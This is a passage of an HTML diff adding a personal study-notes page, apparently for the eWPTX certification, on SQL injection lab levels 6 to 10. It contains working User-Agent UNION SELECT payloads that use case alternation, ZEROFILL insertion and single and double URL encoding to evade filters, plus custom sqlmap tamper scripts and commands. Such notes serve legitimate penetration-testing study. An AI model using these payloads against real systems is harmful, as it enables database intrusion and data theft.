+                    <span class="n">ret_val</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">upper</span><span class="p">()</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">ret_val</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">ret_val</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">lower</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">ret_val</span>
+</code></pre></div></div>
+
+<p>SQLMap command line:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://6.sqli.labs/'</span> <span class="nt">-p</span> user-agent <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--tamper</span><span class="o">=</span>/path/to/your/tampering/scripts/camelcase.py <span class="nt">--prefix</span><span class="o">=</span><span class="s2">"nonexistent'"</span> <span class="nt">--suffix</span><span class="o">=</span><span class="s1">';#'</span> <span class="nt">--union-char</span><span class="o">=</span>els <span class="nt">--banner</span>
+</code></pre></div></div>
+
+<h3 id="sqli-7">SQLi 7</h3>
+<p>In this scenario, the case-insensitive filter cuts out all the reserved words, but the filter is not recursive.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 7.sqli.labs
+User-Agent: <span class="s1">' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
+</span></code></pre></div></div>
+
+<p>Tampering script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="n">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="p">.</span><span class="n">NORMAL</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    Insert FILL after every character
+</span><span class="gp">
+    &gt;&gt;&gt;</span> <span class="nf">tamper</span><span class="p">(</span><span class="sh">'</span><span class="s">INSERT</span><span class="sh">'</span><span class="p">)</span>
+    <span class="sh">'</span><span class="s">IfillNfillSfillEfillRfillTfill
+    </span><span class="sh">"""</span><span class="s">
+
+    retVal = str()
+
+    FILL = </span><span class="sh">'</span><span class="n">ZEROFILL</span><span class="sh">'</span><span class="s">
+
+    if payload:
+        for i in range(len(payload)):
+            retVal += payload[i] + FILL
+    # Uncomment to debug
+    # print </span><span class="sh">"</span><span class="s">pretamper:</span><span class="sh">"</span><span class="s">, payload
+    return retVal
+
+</span></code></pre></div></div>
+
+<p>SQLMap automation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://7.sqli.labs/'</span> <span class="nt">-p</span> user-agent <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--tamper</span><span class="o">=</span>/path/to/your/tampering/scripts/fill.py <span class="nt">--banner</span>
+</code></pre></div></div>
+
+<h3 id="sqli-8">SQLi 8</h3>
+<p>Simple URL encoding.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 8.sqli.labs
+User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
+
+SQLMap Automation:
+
+sqlmap <span class="nt">-u</span> <span class="s1">'http://8.sqli.labs/'</span> <span class="nt">-p</span> user-agent <span class="nt">--tamper</span><span class="o">=</span>charencode <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--banner</span>
+</code></pre></div></div>
+
+<h3 id="sqli-9">SQLi 9</h3>
+<p>Double encoding.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 9.sqli.labs
+User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
+
+SQLMap Automation:
+
+sqlmap <span class="nt">-u</span> <span class="s1">'http://9.sqli.labs/'</span> <span class="nt">-p</span> user-agent <span class="nt">--tamper</span><span class="o">=</span>chardoubleencode <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--banner</span>
+</code></pre></div></div>
+
+<h3 id="sqli-10">SQLi 10</h3>
+<p>This labs combines reserver keyword filtering with an injection in a function.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 10.sqli.labs
+User-Agent: <span class="s1">') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt '</span>PoC<span class="s1">'; -- -
+
+SQLMap Automation:
+
+sqlmap -u '</span>http://10.sqli.labs/<span class="s1">' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix="notexistant'</span><span class="o">)</span><span class="s2">" --suffix="</span><span class="p">;</span> <span class="nt">--</span> <span class="s2">" --union-char=els --banner
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Different sqlmap versions may require different options/flags. For example, regarding level 9:</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://9.sqli.labs/'</span> <span class="nt">-p</span> user-agent <span class="nt">--tamper</span><span class="o">=</span>chardoubleencode <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--banner</span> <span class="nt">--level</span><span class="o">=</span>3 <span class="nt">--risk</span><span class="o">=</span>3
+
+or
+
+sqlmap <span class="nt">-r</span> 9.sqli.labs.For.sqlmap <span class="nt">--banner</span> <span class="nt">--tamper</span><span class="o">=</span>chardoubleencode <span class="nt">--dbms</span> mysql <span class="nt">--batch</span> <span class="nt">--union-char</span><span class="o">=</span>els  <span class="nt">--technique</span><span class="o">=</span>E
+
+<span class="c"># The only one that worked</span>
+<span class="c"># lvl 10 didnt work either</span>
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-01T00:00:00+06:00">December 1, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=7+-+SQL+Injection%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fsqli%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fsqli%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fsqli%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/html5/" class="pagination--pager" title="6 - HTML5
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/sqlievasion/" class="pagination--pager" title="8 - SQLI Filter Evasion
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
